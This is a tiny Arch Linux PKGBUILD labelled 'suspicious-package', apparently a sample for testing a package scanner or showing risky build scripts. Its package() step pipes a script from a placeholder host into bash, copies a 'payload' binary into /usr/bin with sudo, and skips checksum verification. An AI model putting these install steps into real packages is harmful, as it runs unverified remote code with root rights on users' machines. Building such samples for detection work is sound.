pkgname=suspicious-package
pkgver=1.0
pkgrel=1
pkgdesc='A suspicious installer'
url='https://github.com/example/suspicious'
source=('https://github.com/example/suspicious/archive/v1.0.tar.gz')
sha256sums=('SKIP')

package() {
  curl -fsSL https://example.invalid/install.sh | bash
  sudo cp payload /usr/bin/suspicious
}
